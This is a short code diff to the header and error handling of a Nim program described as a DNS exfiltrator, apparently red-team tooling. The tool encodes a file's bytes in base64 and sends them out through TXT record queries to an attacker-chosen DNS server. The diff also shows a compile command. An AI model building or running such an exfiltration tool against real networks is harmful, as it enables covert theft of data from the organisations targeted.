@@ -1,13 +1,12 @@
 #[    
 
-    Copmpile:
-        nim c --d:mingw --d:debug --app=console main.nim
-
-
     Author: HuskyHacks, Twitter: @HuskyHacksMK
     License: BSD 3-Clause
 
     Description: A simple DNS exfiltrator. Reads in the bytes of a specified file, converts them to URL safe b64, then makes TXT record queries to a specified DNS authoritative server.
+
+    Copmpile:
+        nim c --d:mingw --d:debug --app=console dns_exfiltrate.nim
 
     Inspired by: https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1
     Something like this:
@@ -62,7 +61,8 @@ proc dns_exfiltrate(ns: string, dom: string, target: string): void =
             stringindex += CHUNK_SIZE
             sleep(3000)
         except:
-            discard
+            echo "[-] Something broke fam"
+            quit(1)
 
 
 when isMainModule:
